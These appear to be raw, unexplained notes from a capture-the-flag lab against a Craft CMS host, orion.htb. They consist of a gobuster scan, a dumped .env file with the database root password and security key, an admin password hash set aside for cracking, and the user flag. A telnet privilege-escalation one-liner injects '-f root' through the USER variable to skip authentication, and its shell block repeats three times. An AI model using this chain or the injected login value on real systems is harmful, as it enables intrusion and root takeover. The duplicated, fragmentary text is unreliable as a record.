echo "10.129.128.103 orion.htb" | sudo tee -a /etc/hosts

gobuster dir -u http://orion.htb/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip \
  -t 50

At adminn craftSMS 5.16

use meterpreter

  index.html
index.php
cd ..
ls
bootstrap.php
composer.json
composer.lock
config
craft
storage
templates
vendor
web
ls -al
total 364
drwxrwxr-x  7 www-data www-data   4096 Mar  6  2026 .
drwxr-xr-x  3 root     root       4096 Mar  6  2026 ..
-rw-rw-r--  1 www-data www-data    718 Mar  6  2026 .env
-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
-rw-rw-r--  1 www-data www-data    611 Mar  6  2026 composer.json
-rw-rw-r--  1 www-data www-data 310507 Mar  6  2026 composer.lock
drwxrwxr-x  4 www-data www-data   4096 Mar  6  2026 config
-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
drwxrwxr-x  5 www-data www-data   4096 Mar  6  2026 storage
drwxrwxr-x  2 www-data www-data   4096 Mar 10  2026 templates
drwxrwxr-x 49 www-data www-data   4096 Mar  6  2026 vendor
drwxrwxr-x  4 www-data www-data   4096 Mar  7  2026 web
cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/

1 admin adam@orion.htb $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > adam.hash

adam@orion:~$ whoami
adam
adam@orion:~$ ls
user.txt
adam@orion:~$ cat user.txt
8866d431ebed407c075b85daa5756fc5
adam@orion:~$ env USER='-f root' telnet -a 127.0.0.1 23



adam@orion:~$ whoami
adam
adam@orion:~$ ls
user.txt
adam@orion:~$ cat user.txt
8866d431ebed407c075b85daa5756fc5
adam@orion:~$ env USER='-f root' telnet -a 127.0.0.1 23

adam@orion:~$ whoami
adam
adam@orion:~$ ls
user.txt
adam@orion:~$ cat user.txt
8866d431ebed407c075b85daa5756fc5
adam@orion:~$ env USER='-f root' telnet -a 127.0.0.1 23



